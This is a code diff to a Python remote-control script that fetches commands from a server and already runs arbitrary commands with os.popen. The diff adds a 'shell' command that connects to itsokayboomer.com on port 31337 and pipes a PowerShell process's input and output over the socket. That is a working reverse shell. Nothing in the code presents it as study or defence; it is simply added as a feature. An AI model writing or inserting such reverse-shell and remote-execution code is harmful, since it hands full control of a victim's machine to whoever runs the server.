@@ -6,6 +6,13 @@ from sys import platform
 import pyautogui
 import base64
 import sys
+import os, socket, subprocess, threading, sys
+
+def s2p(s, p):
+    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()
+
+def p2s(s, p):
+    while True: s.send(p.stdout.read(1).encode())
 
 if(platform == "win32"):
     import asyncio
@@ -68,9 +75,9 @@ while True:
                 commandArr = data["command"].split(" ")                             
 
                 #should probably use switch statements here
-                if(commandArr[0] == "run"):
+                if(commandArr[0] == "run"):                             #To run any command
                     os.popen(data["command"].split(" ", 1)[1])
-                elif(commandArr[0] == "set"):
+                elif(commandArr[0] == "set"):                               #to set things, rn only volume and media keys
                     if(commandArr[1] == "volume"):
                         if(platform == "win32"):
                             if(commandArr[2] == "mute"):
@@ -94,7 +101,7 @@ while True:
                             pyautogui.press("prevtrack")
                         elif(commandArr[2] == "next"):
                             pyautogui.press("nexttrack")
-                elif(commandArr[0] == "get"):
+                elif(commandArr[0] == "get"):                                   #for getting info, rn only now playing info
                     if(commandArr[1] == "media"):
                         if(platform == "win32"):
                             currentMediaInfo = asyncio.run(get_media_info())
@@ -113,9 +120,35 @@ while True:
                             data["album_artist"] = currentMediaInfo["album_artist"]
                         else:
                             print("todo: oscringe")
+                elif(commandArr[0] == "shell"):                                         #shell connection
+                    ### Need a way for the rest of the program to continue even though this is run, probably make it a separate file ###
+                    ### ALSO NEED TO SPECIFY A PORT ###
+                    
+                    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    connected = False
+
+                    for i in range (0, 5):
+                        try: s.connect(("itsokayboomer.com", 31337)); connected = True; break
+                        except: continue
+
+                    if(connected):
+                        if(platform == "win32"):
+                            if(len(commandArr) < 2):
+                                application = "powershell.exe"
+                            else:
+                                application = commandArr[1]
+                            p=subprocess.Popen([application], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)
+                            threading.Thread(target=s2p, args=[s,p], daemon=True).start()
+                            threading.Thread(target=p2s, args=[s,p], daemon=True).start()
+                            try: p.wait()
+                            except: s.close(); sys.exit(0)
+                        else:
+                            print ("todo: aPpLe cOmPuTeR")
+                    else:
+                        print ("Could not make the connection")
 
                 data["command"] = ""
-                print(data)
+                #print(data)
                 requests.post("https://itsokayboomer.com/dequeue/dequeue.php", data = {'api' : key, 'contents' : json.dumps(data)})
             
         else:
